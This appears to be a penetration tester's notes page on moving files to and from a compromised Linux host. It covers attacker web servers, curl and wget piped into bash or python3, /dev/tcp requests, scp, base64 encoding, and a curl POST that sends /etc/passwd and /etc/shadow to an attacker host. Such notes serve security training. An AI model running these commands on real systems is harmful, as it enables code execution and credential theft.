---
title: Transferring files techniques - Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - linux
  - exploitation
  - file transfer technique
  - backdoors
---

# Transferring files techniques  - Linux

## Replicating client-server 

### Setting up a server in the attacking machine 

#### Apache server

Once you have a folder structure such as "/var/www/" or "/var/www/html", and also an Apache server installed, you can serve all files from that path by initiating the service:

```bash
# Start Apache
service apache2 start

# Stop Apache
service apache2 stop

# Restart Apache
service apache2 restart

# See status of Apache server
service apache2 status
```

In Apache, the PHP module loves to execute anything ending in PHP. Also, by default, with Apache, if we hit a directory without an index file (index.html), it will list all the files.

#### Nginx

In Apache, the PHP module loves to execute anything ending in PHP. This is not very safe when allowing `HTTP` uploads, as we are trying to avoid that users cannot upload web shells and execute them.

```bash
# Create a Directory to Handle Uploaded Files
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# Change the Owner to www-data
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# Create Nginx Configuration File by creating the file /etc/nginx/sites-available/upload.conf with the contents:
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

# Symlink our Site to the sites-enabled Directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# Start Nginx
sudo systemctl restart nginx.service

# If we get any error messages, check /var/log/nginx/error.log. we might see, for instance, port 80 is already in use.
```

Debuggin nginx:

First check: ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory

Second check: Is default port in nginx already in use?

```bash
# Verifying Errors
tail -2 `/var/log/nginx/error.log`
# and we might check that port 80 could not be binded because is already in use

# See which service is using port 80
ss -lnpt | grep `80`
# we will obtain the service and also the pid. For instance `2811`

# Check pid, for instance pid 2811, and see who is running it
ps -ef | grep "2811"

# Remove NginxDefault Configuration to get around this, we can remove the default Nginx configuration, which binds on port 80.
sudo rm /etc/nginx/sites-enabled/default
```

Finally you can copy to your nging server all files you want to transfer with curl:

```bash
curl -T file.txt
# -T, --upload-file <file>; This transfers the specified local file to the remote URL. -T uses PUT http method
```


#### Simple python server

```shell-session
# Creating a Web Server with Python3
cd /tmp
python3 -m http.server 8000

# Creating a Web Server with Python2.7
python2.7 -m SimpleHTTPServer
```


#### Creating a Web Server with PHP

```shell-session
php -S 0.0.0.0:8000
```


#### Creating a Web Server with Ruby

```shell-session
ruby -run -ehttpd . -p8000
```


### Download files from victim's machine

#### wget

```shell-session
wget http://<SERVERIP>:<SERVERPORT>/<file>
```

#### curl

```shell-session
curl http://http://<SERVERIP>:<SERVERPORT>/<file> -o <OutputNameForFile>
```


### Fileless downloads using Linux

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

#### Fileless Download with cURL

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```


#### Fileless Download with wget

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Bash downloads

On the server side (attacking machine), setup a server by using one of the methodologies applied above.

On the client side (victim's machine):

```shell-session
# Connecting to the Target Webserver (attacking machine serving the file)
exec 3<>/dev/tcp/$ip/80

# Requesting the file to the server 
echo -e "GET /file.sh HTTP/1.1\n\n">&3

# Printing the Response
cat <&3
```


## SSH downloads and uploads: SCP

SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. 

Two requirements:

 - we have ssh user credentials on the remote host
 - ssh is open on port 22

On the server's side (attacker's machine):

```shell-session
# Enable the service
sudo systemctl enable ssh

# Start the server
sudo systemctl start ssh

# Check if port is listening
netstat -lnpt
```

From the attacker machine too:

```
# Download file foobar.txt saved in the victim's machin. Command is run from attacker machine connecting to the remote host (victim's machine)
scp username@$IPvictim:foobar.txt /some/local/directory

# Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
scp foo.txt username@$IPvictim:/some/remote/directory
```



## Base64

To avoid firewall protections we can:

**1.** Base64 encode the file:

```shell-session
base64 file.php -w 0

# Alternative
cat file |base64 -w 0;echo

```

**2.** Copy the base64 string, go to the remote host and decode it and pipe to a file:

```shell-session
echo -n "Looooooong-string-encoded-in-base64" | base64 -d > file.php
# -n: do not output the trailing newline
```

## Web upload

We can use [uploadserver](uploadserver.md).


```bash
# Install
python3 -m pip install --user uploadserver

# As we will use https, we will create a self-signed certificate. This file should be hosted in a different location from the web server folder
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start the web server
python3 -m uploadserver 443 --server-certificate /location/different/folder/server.pem

# Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
curl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
# We used the option --insecure because we used a self-signed certificate that we trust.
```


## Backdoors

See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).